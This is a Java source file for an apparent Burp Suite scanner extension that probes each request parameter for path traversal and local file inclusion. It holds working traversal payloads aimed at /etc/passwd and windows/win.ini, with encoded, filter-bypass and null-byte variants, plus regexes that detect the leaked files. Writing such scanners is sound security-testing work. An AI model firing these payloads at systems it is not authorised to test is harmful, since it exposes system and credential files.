package com.ioactive.aiscanner.scan;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.RequestOptions;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.params.ParsedHttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.ioactive.aiscanner.scan.sast.SourceFindings;
import com.ioactive.aiscanner.scan.sast.StaticHint;
import com.ioactive.aiscanner.ui.ScanLog;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Deterministic path-traversal / local-file-inclusion oracle — fully generic (no app paths, no param
 * names). For every parameter of a request it substitutes OS file-read traversals and fires ONLY when
 * a universal OS-file signature appears that was NOT in the baseline response: {@code root:x:0:0:}
 * from *nix {@code /etc/passwd}, or {@code [fonts]}/{@code [boot loader]} from Windows {@code win.ini}/
 * {@code boot.ini}. Signature + differential gated → effectively zero false positives, and the
 * signatures are properties of the OS, not of any target application.
 */
public final class PathTraversalProbe {

    private final MontoyaApi api;
    private final ScanLog scanLog;

    // Generic traversal payloads: depth-saturated, filter-bypass (....//), URL-encoded, absolute,
    // null-byte truncation, and Windows separators. No target-specific filenames beyond OS staples.
    private static final String[] PAYLOADS = {
            "../../../../../../../../../../etc/passwd",
            "....//....//....//....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "/etc/passwd",
            "../../../../../../../../../../etc/passwd%00",
            "..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    };
    private static final Pattern SIG = Pattern.compile(
            "root:.*?:0:0:|\\[fonts\\]|\\[extensions\\]|for 16-bit app support|\\[boot loader\\]");
    private static final Pattern SKIP = Pattern.compile(
            "(?i).*\\.(css|js|png|jpe?g|gif|svg|ico|woff2?|ttf|eot|map|mp4|webp|pdf)(\\?.*)?$");

    private SourceFindings sourceHints;   // optional SAST directives — used only to tag finding provenance

    public PathTraversalProbe(MontoyaApi api, ScanLog scanLog) {
        this.api = api;
        this.scanLog = scanLog;
    }

    public void setSourceHints(SourceFindings hints) { this.sourceHints = hints; }

    /** Source provenance suffix when a matching path/LFI hint exists (else empty). Never affects detection. */
    private String prov(String url, String param) {
        if (sourceHints == null) return "";
        StaticHint h = sourceHints.bestForParam(url, param);
        if (h == null) for (StaticHint x : sourceHints.all())
            if ("Path traversal / File inclusion (LFI)".equalsIgnoreCase(x.vulnClass)
                    && (!x.hasEndpoint() || x.matchesUrl(url))) { h = x; break; }
        return h != null ? "  " + h.provenance() : "";
    }

    /** Probe one request (already carrying the authenticated session) across its parameters. */
    public boolean probe(HttpRequest req) {
        try {
            if (SKIP.matcher(req.url()).matches()) return false;
            String baseBody = body(send(req));
            if (SIG.matcher(baseBody).find()) return false;   // page already contains the signature → skip
            for (ParsedHttpParameter p : req.parameters()) {
                if (p.type() != HttpParameterType.URL && p.type() != HttpParameterType.BODY) continue;
                for (String payload : PAYLOADS) {
                    HttpRequest m = req.withUpdatedParameters(HttpParameter.parameter(p.name(), payload, p.type()));
                    HttpRequestResponse mr = send(m);
                    if (leaks(mr)) {
                        scanLog.found("Path traversal / File inclusion (LFI)", req.url(),
                                p.name() + " (" + p.type() + ") → " + payload + prov(req.url(), p.name()), mr);
                        scanLog.incFinding();
                        return true;
                    }
                }
            }
        } catch (Throwable t) {
            scanLog.debug("[AI Scanner] path-traversal probe error: " + t);
        }
        return false;
    }

    private boolean leaks(HttpRequestResponse r) {
        String b = body(r);
        if (b.isEmpty()) return false;
        Matcher m = SIG.matcher(b);
        return m.find();
    }

    private HttpRequestResponse send(HttpRequest req) {
        try { return api.http().sendRequest(req, RequestOptions.requestOptions().withResponseTimeout(12000L)); }
        catch (Throwable t) { return null; }
    }

    private static String body(HttpRequestResponse rr) {
        try { return rr != null && rr.response() != null ? rr.response().bodyToString() : ""; }
        catch (Throwable t) { return ""; }
    }
}
